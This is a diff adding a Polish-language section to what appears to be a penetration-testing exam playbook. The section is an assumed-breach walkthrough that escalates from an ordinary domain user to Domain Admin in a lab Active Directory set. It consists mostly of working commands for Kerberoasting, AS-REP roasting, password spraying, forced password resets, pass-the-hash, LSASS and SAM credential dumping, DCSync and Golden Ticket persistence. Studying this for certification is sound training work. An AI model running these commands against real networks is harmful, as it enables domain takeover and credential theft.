@@ -2070,6 +2070,126 @@ gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
 
 ---
 
+## 6.7 Assumed-Breach Walkthrough — od usera do Domain Admina
+
+> **To jest scenariusz egzaminacyjny AD (40 pkt).** Dostajesz `username:password` zwykłego usera i 3 maszyny (DC + 2 hosty). Cel: pełna dominacja domeny. Poniżej pętla decyzyjna — **nie liniowa lista, tylko cykl**: enumeruj → znajdź prawo/creds → wykorzystaj → z nowego kontekstu enumeruj ponownie. Powtarzaj aż do DA. Sekcje §X.Y odsyłają do szczegółów w tym playbooku.
+
+```bash
+# Zmienne robocze (Kali). Ustaw RAZ i używaj wszędzie.
+DC=10.10.x.x; DOM=corp.com; DCFQDN=dc01.corp.com
+U='jdoe'; P='Password1!'
+# ZAWSZE synchronizuj czas z DC — Kerberos rozjeżdża się przy skew >5 min:
+sudo ntpdate $DC   ||  sudo rdate -n $DC   ||  faketime "$(sudo net time -S $DC)" bash
+# Dopisz do /etc/hosts (Kerberos wymaga nazw, nie IP!):
+echo "$DC   $DCFQDN $DOM dc01" | sudo tee -a /etc/hosts
+```
+
+### Krok 0 — sanity check: czy creds w ogóle działają
+```bash
+nxc smb $DC -u "$U" -p "$P"                       # [+] corp.com\jdoe (Pwn3d! = jesteś tam lok. adminem)
+nxc smb $DC -u "$U" -p "$P" --shares              # gdzie masz READ/WRITE
+nxc ldap $DC -u "$U" -p "$P"                       # potwierdź, że to DC/LDAP odpowiada
+```
+> ⚠️ **`STATUS_LOGON_FAILURE`** = złe hasło/user. **`STATUS_ACCOUNT_LOCKED_OUT`** = STOP, uważaj ze sprayingiem (lockout policy!). **`KDC_ERR_PREAUTH_FAILED`** przy narzędziach Kerberos = zwykle zły czas → wróć do ntpdate.
+
+### Krok 1 — pełna enumeracja z niskiego konta (fundament wszystkiego)
+```bash
+# BloodHound zdalnie z Kali (NAJPIERW to — mapa całej domeny w 30 s):
+bloodhound-python -u "$U" -p "$P" -d $DOM -dc $DCFQDN -ns $DC -c All --zip
+#  → wgraj .zip do BloodHound, oznacz swojego usera 'Mark as Owned',
+#    potem: "Shortest Paths to Domain Admins from Owned Principals"
+# Masisowa enumeracja obiektów (users/groups/computers/GPO/ACL) — patrz §6.1, §6.2
+nxc ldap $DC -u "$U" -p "$P" --users            # wszyscy userzy (+ opisy = częsty jackpot z hasłem!)
+nxc ldap $DC -u "$U" -p "$P" --groups
+nxc ldap $DC -u "$U" -p "$P" --password-not-required   # konta bez hasła
+```
+> 💎 **Z hosta domenowego** (gdy masz już RDP/shell na maszynie w domenie): odpal `SharpHound.exe -c All` + PowerView (§6.2) — czasem widać więcej niż zdalnie. Sprawdź `net user /domain`, `net group "Domain Admins" /domain`.
+
+### Krok 2 — szybkie zwycięstwa (zrób WSZYSTKIE, zanim ruszysz dalej)
+```bash
+# a) AS-REP Roasting — konta bez wymaganego pre-auth → hash offline (§5.3):
+impacket-GetNPUsers $DOM/ -usersfile users.txt -dc-ip $DC -no-pass -format hashcat
+impacket-GetNPUsers $DOM/"$U":"$P" -dc-ip $DC -request -format hashcat   # z creds = pełna lista
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+
+# b) Kerberoasting — konta z SPN (usługowe) → hash offline (§5.3):
+impacket-GetUserSPNs $DOM/"$U":"$P" -dc-ip $DC -request -outputfile kerb.hash
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+
+# c) GPP cpassword w SYSVOL — hasło odszyfrowywalne publicznym kluczem (§6.6):
+nxc smb $DC -u "$U" -p "$P" -M gpp_password
+
+# d) Password spraying — JEDNO hasło (np. Season2024!) × wielu userów (§5.1):
+nxc smb $DC -u users.txt -p 'Autumn2024!' --continue-on-success   # ⚠️ pilnuj lockout!
+
+# e) Sekrety na share'ach do których masz READ (§6.6):
+nxc smb $DC -u "$U" -p "$P" -M spider_plus       # albo ręcznie: smbclient // + recurse
+```
+> 💎 **Priorytet:** hasła w polu `description` userów, GPP cpassword i Kerberoast łamią się najszybciej i często dają od razu skok. Każde złamane hasło → wróć do **Kroku 0** z nowym `$U/$P`.
+
+### Krok 3 — ACL abuse (gdy BloodHound pokazuje ścieżkę bez hasła)
+```
+BloodHound → node ofiary → prawo nad nim decyduje o technice (§6.5):
+  GenericAll / ForceChangePassword  → reset hasła ofiary (nie znasz starego):
+      net rpc password "ofiara" "NoweHaslo1!" -U "$DOM"/"$U"%"$P" -S $DC
+      (albo: bloodyAD --host $DC -d $DOM -u $U -p $P set password ofiara 'NoweHaslo1!')
+  GenericWrite / WriteProperty       → targeted Kerberoast (dopisz SPN, roastuj, cofnij) — czystsze
+  WriteDacl                          → dopisz sobie GenericAll → potem reset jak wyżej
+  AddMember (nad grupą)              → dodaj się do grupy → aktywują się jej prawa
+```
+> 💎 Po każdym nadużyciu ACL → **zaloguj się jako ofiara** (Krok 0 z jej creds) i **enumeruj ponownie z jej kontekstu**. To jest ta „pętla", która wynosi Cię coraz wyżej.
+
+### Krok 4 — ruch boczny na host, gdzie masz lokalnego admina
+```bash
+# Który host? Tam gdzie 'nxc ... (Pwn3d!)' albo user jest w local Administrators.
+# Masz hasło → impacket/nxc; masz tylko HASH → Pass-the-Hash (§7.2):
+impacket-psexec   $DOM/"$U":"$P"@$TARGET          # SYSTEM shell (§7.1)
+impacket-wmiexec  $DOM/"$U":"$P"@$TARGET          # ciszej, bez usługi
+nxc smb $TARGET -u "$U" -H "$NTHASH" -x 'whoami'  # PtH
+evil-winrm -i $TARGET -u "$U" -p "$P"             # gdy 5985 otwarty (§7.1)
+```
+
+### Krok 5 — dump sekretów z przejętego hosta → nowe creds → PĘTLA
+```bash
+# Na hoscie, gdzie jesteś lokalnym adminem/SYSTEM — wyciągnij co się da (§5.2):
+nxc smb $TARGET -u "$U" -p "$P" --sam --lsa       # lokalny SAM + LSA secrets
+nxc smb $TARGET -u "$U" -p "$P" -M lsassy         # creds z pamięci LSASS
+# Ręcznie na hoscie: mimikatz → sekurlsa::logonpasswords / lsadump::sam
+# Każdy nowy hash/hasło/ticket → wróć do Kroku 0/4. Szukaj konta z admincount=1.
+```
+> 💎 **Cache'owane logowania:** na hoście, na który logował się admin domenowy, LSASS/DPAPI często oddaje jego creds → to zwykle Twój bilet do DC.
+
+### Krok 6 — eskalacja domenowa (finisz)
+```bash
+# Gdy masz konto z prawem replikacji (DA / Domain Admins / DCSync na domenie):
+impacket-secretsdump $DOM/"$daU":"$daP"@$DC -just-dc-user Administrator   # DCSync (§5.6)
+impacket-secretsdump $DOM/"$daU":"$daP"@$DC -just-dc                       # cała domena: krbtgt + wszyscy
+#   → Administrator:500:...:<NTLM>  krbtgt:502:...:<NTLM>  = koniec gry
+# Zaloguj się na DC hashem Administratora (§7.2):
+impacket-psexec -hashes :<NTLM_admina> Administrator@$DC
+
+# Ścieżki nietypowe (gdy BloodHound je pokaże):
+#  • Backup Operators (SeBackupPrivilege) → zrzuć SAM/SYSTEM/NTDS bez DA (§5.6)
+#  • Unconstrained/Constrained/RBCD delegation → nadużycie delegacji Kerberos
+#  • AD CS (ESC1-8) → certipy find; podatny szablon = cert dowolnego usera
+```
+
+### Krok 7 — potwierdzenie i zbiór dowodów (egzamin!)
+```
+□ Masz shell jako SYSTEM/Administrator na WSZYSTKICH 3 maszynach AD-setu
+□ proof.txt / local.txt zebrane INTERAKTYWNYM shellem: type C:\Users\...\Desktop\*.txt
+□ Screenshot: zawartość flagi + ipconfig na tej samej maszynie (§Appendix B)
+□ Wpisane w panelu egzaminacyjnym PRZED końcem czasu
+□ Golden Ticket (opcjonalnie, persistence): z hashem krbtgt (§5.6) — na wypadek reverta
+```
+
+> ### 🧭 Pętla w skrócie (przyklej sobie przed oczy)
+> **enum (Krok 1) → quick wins (2) → ACL abuse (3) → lateral (4) → dump creds (5) → z nowym kontekstem wróć do enum.** Wychodzisz z pętli dopiero na DCSync (6). Utknąłeś ≥30 min? → wróć do BloodHound i przejrzyj *inne* ścieżki z Owned; sprawdź, czy przeoczyłeś opis usera / share / SPN.
+>
+> ⚠️ **Egzamin:** Metasploit/Meterpreter tylko na **JEDNEJ** maszynie w całym egzaminie — **nie pal go w AD-secie** (potrzebny do pivotu i wielu hostów, a MSF pivotu tu nie użyjesz). Trzymaj się impacket/nxc/evil-winrm — legalne i wszędzie.
+
+---
+
 # 7. Lateral Movement (Ruch boczny)
 
 > Cel fazy: z jednego hosta na kolejny, zwykle z pozyskanymi poświadczeniami/hashem.
